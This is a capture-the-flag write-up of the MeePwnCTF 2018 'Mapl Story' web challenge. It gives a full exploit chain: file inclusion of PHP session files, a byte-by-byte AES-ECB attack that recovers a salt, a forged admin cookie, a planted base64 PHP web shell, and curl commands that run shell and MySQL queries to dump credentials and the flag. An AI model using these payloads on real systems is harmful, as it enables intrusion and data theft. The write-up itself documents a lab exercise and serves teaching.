---
layout: post
category: Web
title: MeePwnCTF quals 2018 Mapl Story
tags: 
    - lukas2511
---

Mapl Story was part of the MeePwnCTF Quals 2018 and consists of a webpage where you can name a
"character" and train a pet a command. You get the code but the config is censored.

## Have a look around

First of let's create an account, e.g. foobar@example.org/foobar123, set any name, we'll change that later.

Sign in and have a look at your cookies, you'll see your PHPSESSID and a `_role`.
`_role` is generated using either `sha256("admin".$salt)` or (in this case) `sha256("user".$salt)`.
We need the salt to continue here.

Have a look around the few pages on the site. The game page is completely irrelevant, just a gimmick.

## File inclusion vulnerability

There is a file inclusion vulnerability in index.php, so have a look at e.g. `/index.php?page=/etc/group`.
Unfortunately it uses a GET variable which is heavily escaped so for now there isn't really much we can
directly do with this bug.

## Let's get salty

Let's have a look at `/index.php?page=/var/lib/php/sessions/sess_PHPSESSID` (replace PHPSESSID).

You'll see a variable called `character_name`.
`character_name` is AES-128-ECB encrypted data using `openssl_encrypt($data.$salt,"AES-128-ECB",$key)`.
Since AES-128-ECB is working on 16-byte blocks and we control the start of the string (it's the character name you
can update on your settings page!) we can attack it by brute-forcing byte by byte.

We start of setting a character name like `AAAAAAAAAAAAAAA` (15x'A') and we'll look at the first 32 characters
of the hash in the session file, now we start trying printable characters at the 16. position, we'll find a hash
match at `AAAAAAAAAAAAAAAm` so we now the salt starts with `m`. Next we do the same thing with
`AAAAAAAAAAAAAA` (14x'A') and will get the hash and try characters again, the next match will be `AAAAAAAAAAAAAAms`.

We'll continue this until we finally get the salt: `ms_g00d_0ld_g4m3`.

## Becoming admin

Becoming admin now is as simple as writing the result of `sha256("admin"."ms_g00d_0ld_g4m3")` into our `_role`
cookie. After refreshing the page you'll see the admin link appearing in the navigation bar.

`sha256("admin"."ms_g00d_0ld_g4m3") => a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054`

## Give yourself a pet

In the admin menu you have to give yourself a pet. This will allow you to train it commands on the character
page, which is just writing a text-file under `"uploads/".md5($salt.$email)."/command.txt`.
A lot of characters are filtered and you can only write 19 characters, so you can't really do much with this
alone.

19 characters is just barely long enough to fit a base64-encoded ```<?=`$_GET[1]`;``` (`PD89YCRfR0VUWzFdYDs` – slightly broken padding), which would give us a shell, but now we need a way to actually decode and execute that...

## Choose a new name

Well, if you looked carefully at the session file you would have noticed the clear-text `action` part, which
contains the last logged line. There is one log-line in the code-base which we can control, when giving a player
a pet the log will contain the character name at the end.

I think `<?=include"$_COOKIE[0]` is a beautiful name, don't you think? So what does this do?... It allows us to
include files using a cookie named `0`. Since cookies are not filtered inside the script we now have full control
over the file inclusion.

## Execute your first command

Now that everything is prepared we need a final way to execute the base64-encoded php code we trained our pet earlier,
but that's really simple, PHP actually has a built-in helper for that: `php://filter/convert.base64-decode/resource=path/to/file`.

In case of `foobar@example.org` (considering the upload path mentioned before) a command-execution now looks like this:

```
Ξ ~ → curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'      
character_name|s:96:"d1f197d11ed6b3d29f08a9893429eb2bfa19e4543ff1d33bf19c5a89aec19b45080a355c37b4654ec2a5813f81dbe98b";user|s:96:"917467323f3a8e09ab1c2a2d7e3dc3ac85c0c4f08622b7e10a4ec4a18ad36e9919326131b516d9053ee8980a1230ad0e";action|s:65:"[02:27:52am GMT+7] gave blackpig to player admin.php
assets
character.php
dbconnect.php
die.php
game.php
home.php
index.php
login.php
logout.php
mapl_library.php
register.php
setting.php
style.css
upload
1
```

## Attack!

From there we can take a look at `dbconnect.php` (`&1=cat%20dbconnect.php`) and we'll find the mysql username and password:

```
define('DBUSER', 'mapl_story_user');
define('DBPASS', 'tsu_tsu_tsu_tsu'); 
define('DBNAME', 'mapl_story');
```

Now let's see what's in the `mapl_config` table that is mentioned a few times in the script (it should at least contain the encryption key):

```
curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=echo%20%27SELECT%20%2A%20FROM%20mapl_config%3B%27|%20mysql%20-umapl_story_user%20-ptsu_tsu_tsu_tsu%20mapl_story' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt' 
character_name|s:96:"d1f197d11ed6b3d29f08a9893429eb2bfa19e4543ff1d33bf19c5a89aec19b45080a355c37b4654ec2a5813f81dbe98b";user|s:96:"917467323f3a8e09ab1c2a2d7e3dc3ac85c0c4f08622b7e10a4ec4a18ad36e9919326131b516d9053ee8980a1230ad0e";action|s:65:"[02:27:52am GMT+7] gave blackpig to player mapl_salt	mapl_key	mapl_now_get_your_flag
ms_g00d_0ld_g4m3	You_Never_Guess_This_Tsug0d_1337	MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___}
1
```

There we go, we got our flag `MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___}` :)
